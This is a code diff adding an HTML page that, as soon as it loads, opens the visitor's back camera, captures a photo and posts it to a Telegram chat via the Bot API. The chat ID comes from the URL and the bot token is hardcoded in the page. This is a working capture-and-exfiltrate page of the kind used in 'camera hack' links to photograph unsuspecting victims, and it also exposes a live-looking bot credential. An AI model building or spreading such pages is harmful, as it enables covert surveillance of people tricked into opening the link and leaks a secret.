@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture and Send</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        h1 {
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Capturing and Sending Image...</h1>
+    <script>
+        // Extract the chat ID from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get("chat_id");
+
+        if (!chatId) {
+            alert("Chat ID not provided. Please add ?chat_id=YOUR_CHAT_ID to the URL.");
+            throw new Error("Chat ID is missing from the URL.");
+        }
+
+        const telegramBotToken = "7365274173:AAGvLK3iuVgvbBwMCUgYF4vr2xfYkyC6OX4"; // Replace with your bot token
+
+        async function captureAndSend() {
+            try {
+                // Access the back camera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" }
+                });
+
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+
+                // Capture a frame after the video starts
+                video.onloadedmetadata = () => {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext("2d");
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Stop the camera
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Convert the image to a Blob
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append("chat_id", chatId);
+                        formData.append("photo", blob, "image.jpg");
+
+                        // Send the photo to Telegram
+                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                            method: "POST",
+                            body: formData,
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                alert("Photo sent successfully!");
+                            } else {
+                                alert("Failed to send photo: " + data.description);
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Error sending photo:", error);
+                            alert("An error occurred.");
+                        });
+                    }, "image/jpeg");
+                };
+            } catch (error) {
+                console.error("Error accessing the camera:", error);
+                alert("Failed to access the camera. Please grant permission.");
+            }
+        }
+
+        // Automatically capture and send when the page loads
+        window.onload = captureAndSend;
+    </script>
+</body>
+</html>
